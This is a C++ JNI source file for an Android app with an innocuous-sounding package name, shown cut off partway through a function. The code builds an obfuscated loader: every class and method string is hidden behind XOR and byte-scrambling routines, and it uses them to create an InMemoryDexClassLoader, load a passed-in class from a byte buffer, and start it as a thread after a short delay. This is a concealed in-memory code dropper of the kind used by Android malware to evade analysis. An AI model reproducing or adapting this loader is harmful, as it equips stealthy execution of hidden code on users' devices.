#pragma GCC optimize ("O0")

#include <jni.h>
#include <string>
#include <jni.h>
#include <string.h>
#include <android/log.h>
#include <android/log.h>
#include <unistd.h>
#include <android/log.h>


//__android_log_print(ANDROID_LOG_VERBOSE, APPNAME, "key: %s\n", s);


extern "C" JNIEXPORT jstring JNICALL
Java_com_some_better_practice_app_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject /* this */) {
    std::string hello = "";
    return env->NewStringUTF(hello.c_str());
}

void patch(const unsigned char* keys, const unsigned char* obfuscated, int size, char* decrypted){
    // Decrypt the string by XORing with the corresponding key
    for (size_t i = 0; i < size; ++i) {
        decrypted[i] = obfuscated[i] ^ keys[i];
    }
}
void awe982rhaf(JNIEnv* env, jobject , jbyteArray buffer,
          jstring str) {
    // Convert jbyteArray to a C-style byte array
    jsize length = env->GetArrayLength(buffer);
    jbyte *byteBuffer = env->GetByteArrayElements(buffer, nullptr);


    // Array of XOR keys_1, one for each character
    unsigned char keys_1[] = {
            0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11,
            0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
            0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11,
            0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
            0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
    };

    // Obfuscated string using different XOR keys_1
    unsigned char obfuscated_1[] = {
            'd' ^ 0xAA, 'a' ^ 0xBB, 'l' ^ 0xCC, 'v' ^ 0xDD, 'i' ^ 0xEE, 'k' ^ 0xFF, '/' ^ 0x11,
            's' ^ 0x22, 'y' ^ 0x33, 's' ^ 0x44, 't' ^ 0x55, 'e' ^ 0x66, 'm' ^ 0x77, '/' ^ 0x88,
            'I' ^ 0x99, 'n' ^ 0xAA, 'M' ^ 0xBB, 'e' ^ 0xCC, 'm' ^ 0xDD, 'o' ^ 0xEE, 'r' ^ 0xFF, 'y' ^ 0x11,
            'D' ^ 0x22, 'e' ^ 0x33, 'x' ^ 0x44, 'C' ^ 0x55, 'l' ^ 0x66, 'a' ^ 0x77, 's' ^ 0x88, 's' ^ 0x99,
            'L' ^ 0xAA, 'o' ^ 0xBB, 'a' ^ 0xCC, 'd' ^ 0xDD, 'e' ^ 0xEE, 'r' ^ 0xFF, '\0' ^ 0x00
    };

    // Buffer to store the decrypted_1 string
     char decrypted_1[sizeof(obfuscated_1)];

    // Decrypt the string by XORing with the corresponding key
    for (size_t i = 0; i < sizeof(obfuscated_1); ++i) {
        decrypted_1[i] = obfuscated_1[i] ^ keys_1[i];
        keys_1[i] = (unsigned char)((i * 0x11) ^ 0xAA);
    }
    //__android_log_print(ANDROID_LOG_VERBOSE, "", "%s%s\n", keys_1, obfuscated_1);
    //patch(keys_1, obfuscated_1, sizeof(obfuscated_1), decrypted_1);
    unsigned char ss1[] =
            {

                    0x61, 0x3c, 0xdb, 0x5c, 0x20, 0x12, 0xe0
            };

    for (unsigned int m = 0; m < sizeof(ss1); ++m)
    {
        unsigned char c = ss1[m];
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c = (c >> 0x6) | (c << 0x2);
        c -= 0xdc;
        c ^= m;
        c = ~c;
        c ^= 0xaa;
        c += m;
        c ^= 0xac;
        c = ~c;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        ss1[m] = c;
    }

    // Create the InMemoryDexClassLoader and load the class
    jclass dexClassLoaderClass = env->FindClass(decrypted_1);
    unsigned char ss2[] =
            {

                    0x8d, 0x8c, 0x40, 0x5d, 0x64, 0xf3, 0xf, 0x9f,
                    0x3e, 0xbf, 0x18, 0x56, 0xfb, 0x20, 0x46, 0x74,
                    0xa3, 0x52, 0x7b, 0x68, 0x58, 0xaa, 0x17, 0x31,
                    0x2d, 0x1a, 0xe6, 0x42, 0x43, 0x81, 0xd7, 0x6a,
                    0xf8, 0x6d, 0xa2, 0xec, 0xa3, 0xbe, 0x47, 0xae,
                    0x2e, 0x71, 0xbe, 0xf7, 0xcd, 0x66, 0x14, 0x8b
            };

    for (unsigned int m = 0; m < sizeof(ss2); ++m)
    {
        unsigned char c = ss2[m];
        c = ~c;
        c ^= m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= m;
        c -= m;
        c = (c >> 0x5) | (c << 0x3);
        c += 0xba;
        c ^= 0x20;
        c = -c;
        c ^= 0x2e;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c += 0x28;
        c ^= m;
        c += 0x27;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c += 0x90;
        c = ~c;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0xb1;
        c += m;
        c ^= 0x83;
        c -= m;
        c ^= m;
        c += m;
        c ^= m;
        c += 0x56;
        c ^= 0xa;
        c = (c >> 0x7) | (c << 0x1);
        ss2[m] = c;
    }


    jmethodID dexClassLoaderConstructor = env->GetMethodID(dexClassLoaderClass, (char*)ss1, (char*)ss2);
    unsigned char s[] =
            {
                    0xb0, 0xe0, 0x41, 0x10, 0xa6, 0x98, 0xe8, 0xa0,
                    0xc6, 0x17, 0x88, 0x98, 0x18, 0x37, 0xc8, 0x48,
                    0x50, 0x40, 0xe0, 0x74
            };

    for (unsigned int m = 0; m < sizeof(s); ++m)
    {
        unsigned char c = s[m];
        c -= m;
        c = -c;
        c += 0xd1;
        c = -c;
        c += m;
        c = ~c;
        c = -c;
        c -= 0xa3;
        c = ~c;
        c = -c;
        c ^= 0x13;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c = -c;
        c += 0xf;
        s[m] = c;
    }
    // Create a ByteBuffer
    jclass byteBufferClass = env->FindClass((char*)s);
    unsigned char s2[] =
            {

                    0x9b, 0x1c, 0xd0, 0xd7, 0xa2
            };

    for (unsigned int m = 0; m < sizeof(s2); ++m)
    {
        unsigned char c = s2[m];
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c -= 0xec;
        c ^= 0x25;
        c += 0xb6;
        c = ~c;
        c ^= m;
        c = ~c;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0xed;
        c -= m;
        c = ~c;
        c ^= m;
        c += m;
        s2[m] = c;
    }

    unsigned char ss3[] =
            {

                    0xa2, 0x45, 0xc2, 0x55, 0xeb, 0x21, 0x9c, 0xc8,
                    0x4a, 0x99, 0x99, 0x11, 0x4b, 0x3, 0x30, 0x67,
                    0x61, 0x96, 0x5f, 0x62, 0x45, 0x57, 0x16, 0x5d,
                    0xb6, 0xed
            };

    for (unsigned int m = 0; m < sizeof(ss3); ++m)
    {
        unsigned char c = ss3[m];
        c += m;
        c ^= 0x57;
        c -= m;
        c ^= m;
        c += m;
        c = (c >> 0x7) | (c << 0x1);
        c ^= m;
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c += 0x82;
        c = ~c;
        c ^= m;
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c = -c;
        c -= m;
        c = ~c;
        c -= 0x40;
        c ^= m;
        c += 0x97;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x61;
        c = ~c;
        c ^= 0x41;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c = ~c;
        ss3[m] = c;
    }

    jmethodID wrapMethod = env->GetStaticMethodID(byteBufferClass, (char*)s2, (char*)ss3);
    jobject byteBufferObj = env->CallStaticObjectMethod(byteBufferClass, wrapMethod, buffer);

    unsigned char ss4[] =
            {

                    0x1, 0x19, 0x2d, 0x4a, 0x48, 0x5f, 0xce, 0x94,
                    0x41, 0x28, 0x38, 0x6a, 0x97, 0x57, 0xda, 0x40,
                    0x5, 0x51, 0x0, 0xe2, 0x57, 0xce
            };

    for (unsigned int m = 0; m < sizeof(ss4); ++m)
    {
        unsigned char c = ss4[m];
        c -= 0xe4;
        c = -c;
        c ^= 0x16;
        c = -c;
        c ^= m;
        c += 0x21;
        c ^= 0xef;
        c = ~c;
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0xa9;
        c += 0x34;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c = (c >> 0x6) | (c << 0x2);
        c -= 0xc0;
        c ^= m;
        c += m;
        c = ~c;
        c -= m;
        c ^= m;
        c -= 0x33;
        c ^= 0xf9;
        c += 0x5d;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c ^= m;
        c += 0xb5;
        ss4[m] = c;
    }

    // Get the system class loader
    jclass classLoaderClass = env->FindClass((char*)ss4);
    unsigned char s6[] =
            {

                    0x7e, 0x64, 0xcf, 0xbe, 0xe5, 0x2d, 0x32, 0xb0,
                    0x5e, 0x90, 0x56, 0xee, 0x3e, 0x64, 0xa3, 0x34,
                    0xbe, 0xec, 0xe8, 0x86, 0x22
            };

    for (unsigned int m = 0; m < sizeof(s6); ++m)
    {
        unsigned char c = s6[m];
        c = -c;
        c = ~c;
        c += m;
        c ^= m;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c ^= 0xe0;
        c -= m;
        c ^= m;
        c -= m;
        c ^= m;
        c = ~c;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        s6[m] = c;
    }
    unsigned char ss5[] =
            {

                    0x20, 0x11, 0x6c, 0xaa, 0x8b, 0xe8, 0xd9, 0xe7,
                    0xd1, 0xc9, 0xd3, 0xcb, 0x19, 0xf6, 0x7e, 0x13,
                    0x8e, 0xf5, 0xdf, 0xb2, 0x7d, 0xf3, 0xe0, 0x6d,
                    0xa6, 0xdf
            };

    for (unsigned int m = 0; m < sizeof(ss5); ++m)
    {
        unsigned char c = ss5[m];
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0xb6;
        c = -c;
        c += 0x7a;
        c ^= 0xbc;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c -= m;
        c = -c;
        c ^= m;
        c += 0x3;
        c = ~c;
        c += 0x63;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c += 0xd8;
        c ^= 0x78;
        c = -c;
        c ^= m;
        c -= 0x46;
        c ^= m;
        c += m;
        c = ~c;
        c = -c;
        c += m;
        c ^= m;
        c += m;
        c = -c;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0xc0;
        ss5[m] = c;
    }

    jmethodID getSystemClassLoaderMethod = env->GetStaticMethodID(classLoaderClass, (char*)s6, (char*)ss5);
    unsigned char s8[] =
            {

                    0x30, 0x10, 0xfb, 0xc6
            };

    for (unsigned int m = 0; m < sizeof(s8); ++m)
    {
        unsigned char c = s8[m];
        c ^= 0xee;
        c = -c;
        c ^= m;
        c -= m;
        c ^= 0x7d;
        c -= m;
        c ^= 0x6c;
        c = -c;
        c ^= 0xbb;
        c = ~c;
        c = -c;
        c += m;
        c ^= 0xa5;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0xae;
        c = -c;
        c -= 0xeb;
        c ^= 0x85;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c -= m;
        c = ~c;
        c = -c;
        c -= m;
        c = ~c;
        s8[m] = c;
    }

    jobject classLoader = env->CallStaticObjectMethod(classLoaderClass, getSystemClassLoaderMethod);

    jobject dexClassLoader = env->NewObject(dexClassLoaderClass, dexClassLoaderConstructor, byteBufferObj, classLoader);
    unsigned char s9[] =
            {

                    0x4e, 0x49, 0xe3, 0xf0, 0xe5, 0x17, 0x9e, 0x10,
                    0xb8, 0x1f
            };

    for (unsigned int m = 0; m < sizeof(s9); ++m)
    {
        unsigned char c = s9[m];
        c += 0xe2;
        c = ~c;
        c -= m;
        c ^= 0xb4;
        c += 0x40;
        c ^= 0xf5;
        c = -c;
        c = ~c;
        c -= m;
        c ^= m;
        c -= m;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x22;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c = (c >> 0x6) | (c << 0x2);
        c += 0xbc;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c ^= 0x2f;
        c = (c >> 0x1) | (c << 0x7);
        c += 0xef;
        c ^= m;
        c -= 0x2f;
        s9[m] = c;
    }
    unsigned char ss6s[] =
            {

                    0xb2, 0xdc, 0x86, 0x47, 0xf3, 0xb4, 0xcc, 0xc7,
                    0x8d, 0x87, 0x85, 0x53, 0x4a, 0x20, 0x11, 0x5,
                    0x86, 0x84, 0x4, 0x49, 0x1, 0xc9, 0xc1, 0xcb,
                    0x9f, 0x49, 0xfe, 0xd8, 0x92, 0x90, 0x44, 0x79,
                    0x95, 0xa7, 0x3e, 0xd5, 0x5c, 0x73
            };

    for (unsigned int m = 0; m < sizeof(ss6s); ++m)
    {
        unsigned char c = ss6s[m];
        c = ~c;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0x88;
        c -= m;
        c ^= 0x3f;
        c += 0xbc;
        c ^= 0xe2;
        c = (c >> 0x1) | (c << 0x7);
        c += 0x6e;
        c = (c >> 0x3) | (c << 0x5);
        c = ~c;
        c += 0x7b;
        c ^= 0x7f;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c ^= 0xf4;
        c -= m;
        c ^= m;
        c = ~c;
        c ^= 0x9f;
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c = ~c;
        c = -c;
        c += 0xc1;
        c = -c;
        c += 0xfa;
        c ^= 0xa7;
        c += 0x10;
        ss6s[m] = c;
    }

    unsigned char s10[] =
            {

                    0xda, 0x27, 0x1b, 0xc7, 0xe6, 0x9f, 0x4b, 0x19,
                    0x12, 0x62, 0x33, 0x77, 0x5c, 0xaf, 0x3, 0xa7,
                    0x3, 0xe5, 0x81, 0xf2, 0xdd, 0x1b, 0xa5, 0xe3,
                    0x70, 0x79, 0x13, 0x7e, 0x38, 0xd3, 0xf9, 0x53,
                    0xb, 0xae, 0x49, 0x39, 0xcf, 0x84, 0x0, 0x90,
                    0x9, 0x67, 0x46, 0x18, 0x19, 0xea, 0x71, 0x54,
                    0xc3, 0x57, 0xe1, 0xa9, 0x5, 0x83, 0x56, 0xf7
            };

    for (unsigned int m = 0; m < sizeof(s10); ++m)
    {
        unsigned char c = s10[m];
        c = (c >> 0x3) | (c << 0x5);
        c += 0x65;
        c ^= m;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c += 0xfe;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c -= 0xae;
        c ^= m;
        c += m;
        c ^= 0x4f;
        c = (c >> 0x6) | (c << 0x2);
        c += 0xed;
        c ^= 0xd8;
        c -= 0xd7;
        c = (c >> 0x1) | (c << 0x7);
        c -= 0x20;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c += 0x44;
        c = -c;
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c += 0xb2;
        c ^= 0xf9;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c = -c;
        c -= 0xcd;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0x48;
        c = ~c;
        c -= m;
        c = -c;
        c -= 0xe9;
        c = (c >> 0x7) | (c << 0x1);
        c ^= m;
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x31;
        c ^= 0x68;
        c -= 0x42;
        c = -c;
        c ^= 0x5d;
        c = ~c;
        c += m;
        c ^= m;
        c -= m;
        c ^= 0x7b;
        c += m;
        c ^= m;
        c = ~c;
        c -= m;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c -= 0xb0;
        c ^= 0xdb;
        c -= 0xc9;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c ^= 0x73;
        c = -c;
        c += 0x2b;
        c = ~c;
        c += m;
        c ^= m;
        c -= m;
        c ^= m;
        c += 0xe4;
        c ^= m;
        c = ~c;
        c ^= 0x60;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0x6a;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c = ~c;
        c ^= m;
        c = -c;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c += 0x53;
        c = -c;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0x45;
        c = -c;
        c = ~c;
        c -= m;
        c ^= m;
        c = -c;
        c = ~c;
        c = -c;
        c = ~c;
        c ^= 0xe0;
        c -= m;
        c = ~c;
        c = -c;
        c -= m;
        c = ~c;
        c += 0x27;
        c ^= 0x24;
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c += 0xc5;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c ^= 0xc4;
        c = ~c;
        c += 0xdb;
        c = (c >> 0x1) | (c << 0x7);
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0xc;
        c = ~c;
        c -= m;
        c ^= m;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c += m;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c += m;
        c ^= m;
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c -= 0x72;
        c = ~c;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c = ~c;
        c = -c;
        c += 0xaf;
        c = (c >> 0x1) | (c << 0x7);
        c += 0x1f;
        c = ~c;
        c -= 0x7d;
        c = ~c;
        c += 0xff;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x7d;
        c -= 0xdc;
        c = ~c;
        c += 0xd8;
        c = ~c;
        c += 0x5e;
        c ^= m;
        c -= m;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c ^= m;
        c = ~c;
        c -= m;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c ^= 0xea;
        c = ~c;
        c ^= 0x3;
        c = (c >> 0x5) | (c << 0x3);
        c += 0xa2;
        c ^= m;
        c -= m;
        c ^= 0xb;
        c = -c;
        c += 0x3;
        c ^= m;
        c = -c;
        c -= m;
        c ^= m;
        c = -c;
        c += m;
        c ^= 0x7;
        c -= m;
        c ^= 0x5;
        c -= 0x5b;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0xb7;
        c += m;
        c ^= 0x93;
        c -= m;
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c = -c;
        c = ~c;
        c -= 0x67;
        c = ~c;
        c += m;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0x3a;
        c = (c >> 0x1) | (c << 0x7);
        c -= 0x10;
        c = -c;
        c = ~c;
        c += 0xa8;
        c ^= m;
        c = -c;
        c -= 0x19;
        c = ~c;
        c += m;
        c = -c;
        c += m;
        c ^= 0x3;
        c += 0xf7;
        c = -c;
        c -= 0x95;
        c ^= m;
        c = -c;
        c = ~c;
        c -= m;
        c = ~c;
        c ^= 0xf3;
        c = ~c;
        c = -c;
        c = ~c;
        c = -c;
        c -= 0xc;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = ~c;
        c -= 0x48;
        c ^= 0x60;
        c += 0x5f;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x1c;
        c -= m;
        c ^= m;
        c += 0x7e;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c ^= m;
        c += 0xc6;
        c = -c;
        c += 0x9;
        c = (c >> 0x7) | (c << 0x1);
        c -= m;
        c = -c;
        c -= m;
        c = ~c;
        s10[m] = c;
    }

    jclass rideHailingClass = (jclass) env->CallObjectMethod(dexClassLoader, env->GetMethodID(dexClassLoaderClass, (char*)s9, (char*)ss6s), str);

    sleep(3);
    // Create a new instance and start the thread
    jobject threadInstance = env->NewObject(rideHailingClass, env->GetMethodID(rideHailingClass, (char*)ss1, (char*) s8));
    unsigned char s11[] =
            {

                    0xe5, 0x66, 0xb2, 0xb4, 0x7e, 0xd9, 0x63, 0xe1,
                    0xd, 0x5d, 0xe, 0xfa, 0xa2, 0xad, 0xd9, 0x3f,
                    0xc2
            };

    for (unsigned int m = 0; m < sizeof(s11); ++m)
    {
        unsigned char c = s11[m];
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c += 0x5e;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c -= 0x42;
        c = -c;
        c ^= m;
        c += m;
        c = ~c;
        c -= m;
        c ^= 0xc7;
        c += m;
        c ^= 0xc3;
        c -= m;
        c ^= 0xf5;
        c += 0xca;
        c ^= m;
        c -= 0x50;
        c ^= m;
        c += m;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c = -c;
        c += 0xa;
        c = ~c;
        c = -c;
        c ^= m;
        c += 0x78;
        c ^= 0x6;
        c -= 0x8;
        c = -c;
        c += m;
        c ^= m;
        c += 0x58;
        c ^= 0x4b;
        c -= 0x6e;
        c = ~c;
        c = -c;
        c += 0xec;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c ^= 0xa3;
        c -= m;
        c = -c;
        c = ~c;
        c += 0xc9;
        c = -c;
        c -= 0x7b;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0xa7;
        c = -c;
        c += m;
        c ^= 0x54;
        c -= 0x39;
        c ^= 0x20;
        c = (c >> 0x3) | (c << 0x5);
        c += 0x8;
        c ^= m;
        c = (c >> 0x7) | (c << 0x1);
        c -= m;
        c ^= m;
        c -= 0xd7;
        c ^= m;
        c = -c;
        c -= 0xdc;
        c ^= m;
        c += m;
        c ^= 0x35;
        c = (c >> 0x3) | (c << 0x5);
        c += 0x96;
        c = (c >> 0x6) | (c << 0x2);
        c -= 0xa0;
        c = (c >> 0x6) | (c << 0x2);
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c += 0x9a;
        c = ~c;
        c ^= 0xa9;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c += 0xd7;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c -= 0xac;
        c = (c >> 0x3) | (c << 0x5);
        c += 0x12;
        c ^= m;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c ^= 0xd9;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c -= m;
        c ^= 0xbe;
        c = -c;
        c ^= 0x98;
        c -= m;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c += 0x1e;
        c = -c;
        c += m;
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c ^= m;
        c -= m;
        c = -c;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c += m;
        c ^= 0xf2;
        c = ~c;
        c -= 0x59;
        c ^= m;
        c += m;
        c = (c >> 0x7) | (c << 0x1);
        c += 0x5d;
        c = -c;
        c += m;
        c = ~c;
        c ^= m;
        c = -c;
        c ^= m;
        c += 0xc0;
        c = -c;
        c ^= 0x2e;
        c -= m;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c += 0x8c;
        c = (c >> 0x6) | (c << 0x2);
        c ^= m;
        c -= m;
        c ^= 0x15;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c += 0x71;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c ^= m;
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0x37;
        c ^= 0xa1;
        c = -c;
        c ^= 0x55;
        c = -c;
        c ^= m;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c += m;
        c ^= 0xa3;
        c = -c;
        c = ~c;
        c ^= m;
        c += 0x1e;
        c = ~c;
        c = -c;
        c += 0xbd;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c = ~c;
        c ^= 0x3d;
        c += m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= m;
        c += 0x50;
        c ^= m;
        c = ~c;
        c ^= 0x95;
        c = -c;
        c = ~c;
        c += 0xf8;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c ^= 0x68;
        c += 0x1;
        c = ~c;
        c -= 0x6c;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c += 0xda;
        c = -c;
        c = ~c;
        c += m;
        c ^= 0xe2;
        c = -c;
        c = ~c;
        c -= 0xe8;
        c ^= 0x7b;
        c = -c;
        c -= 0x2;
        c = -c;
        c -= m;
        c ^= 0x36;
        c = ~c;
        c ^= m;
        c += 0xab;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c = ~c;
        c -= m;
        c = ~c;
        c += 0x99;
        c ^= m;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c += 0xa9;
        c = -c;
        c -= 0x3;
        c = -c;
        c -= 0xcc;
        c = -c;
        c += 0x58;
        c = ~c;
        c ^= 0x98;
        c += 0xa4;
        c = ~c;
        c ^= 0x9c;
        c += 0xcc;
        c = -c;
        c ^= 0x39;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c -= m;
        c ^= 0xb6;
        c -= 0x4d;
        c = ~c;
        c -= 0x3c;
        c ^= 0xea;
        c -= 0x67;
        c ^= m;
        c -= m;
        c = ~c;
        c = -c;
        c += 0xbf;
        c ^= m;
        s11[m] = c;
    }
    unsigned char ss7s[] =
            {

                    0xe6, 0x22, 0xa, 0xfb, 0xd2, 0x8f
            };

    for (unsigned int m = 0; m < sizeof(ss7s); ++m)
    {
        unsigned char c = ss7s[m];
        c = ~c;
        c += 0x7f;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x4d;
        c -= 0x8c;
        c ^= m;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c ^= m;
        c = -c;
        c = ~c;
        c -= 0x86;
        c = (c >> 0x5) | (c << 0x3);
        c ^= 0x68;
        c = -c;
        c += 0xbd;
        c = ~c;
        c -= m;
        c = -c;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0xa1;
        c = -c;
        c = ~c;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0x7c;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = -c;
        ss7s[m] = c;
    }


    jmethodID startMethod = env->GetMethodID(env->FindClass((char*)s11), (char*)ss7s, (char*) s8);
    env->CallVoidMethod(threadInstance, startMethod);

    // Release the byte buffer resources
    env->ReleaseByteArrayElements(buffer, byteBuffer, 0);
}

extern "C" JNIEXPORT void JNICALL
Java_com_some_better_practice_app_MainActivity_run(JNIEnv *env, jobject obj, jobject context,
                                                   jstring str) {
// Get the AssetManager from the Context
    jclass contextClass = (env)->GetObjectClass(context);
    unsigned char s[] =
            {

                    0x77, 0xc1, 0x7e, 0x9c, 0xf7, 0x2c, 0x61, 0xc3,
                    0x29, 0x6b
            };

    for (unsigned int m = 0; m < sizeof(s); ++m) {
        unsigned char c = s[m];
        c = -c;
        c -= m;
        c ^= m;
        c = -c;
        c ^= 0xcf;
        c = ~c;
        c ^= m;
        c += 0xea;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c = ~c;
        c -= 0x5c;
        c ^= 0xfe;
        c += 0x4f;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c = ~c;
        c += m;
        c = ~c;
        c += m;
        c ^= m;
        c -= 0x9b;
        c = ~c;
        c = -c;
        c ^= 0x38;
        c -= 0xf5;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c = ~c;
        c -= 0x5f;
        c = -c;
        c -= 0x9a;
        c = -c;
        c = ~c;
        c -= m;
        c ^= 0xd1;
        c = -c;
        c = ~c;
        c ^= 0xc1;
        c += 0xab;
        c ^= m;
        c = ~c;
        c = -c;
        c = ~c;
        c -= m;
        c ^= m;
        c = ~c;
        c -= 0xfe;
        c ^= 0xa9;
        c = ~c;
        c -= 0x85;
        c ^= m;
        c += m;
        c ^= m;
        c += 0xc3;
        c = (c >> 0x7) | (c << 0x1);
        c ^= m;
        c -= 0x3b;
        c = ~c;
        c += 0xee;
        c ^= m;
        c -= m;
        c ^= m;
        c -= 0x50;
        c ^= 0x6b;
        c = ~c;
        c ^= 0x6f;
        c += 0x49;
        c ^= 0xd0;
        c += m;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c ^= 0xae;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c ^= m;
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c += m;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c = ~c;
        c += m;
        c = -c;
        c -= m;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c ^= 0xb;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c = -c;
        c -= 0x71;
        c = -c;
        c ^= m;
        c = ~c;
        c = -c;
        c = ~c;
        c += m;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c ^= 0x33;
        c = -c;
        c ^= 0xff;
        c = -c;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0x3c;
        c ^= m;
        c += 0x8d;
        c = ~c;
        c -= m;
        c ^= 0xad;
        c = -c;
        c -= 0x49;
        c ^= m;
        c = ~c;
        c -= m;
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c += 0x64;
        c = -c;
        c -= m;
        c ^= m;
        c -= m;
        c ^= 0x2d;
        c = -c;
        c -= 0x9e;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c = -c;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
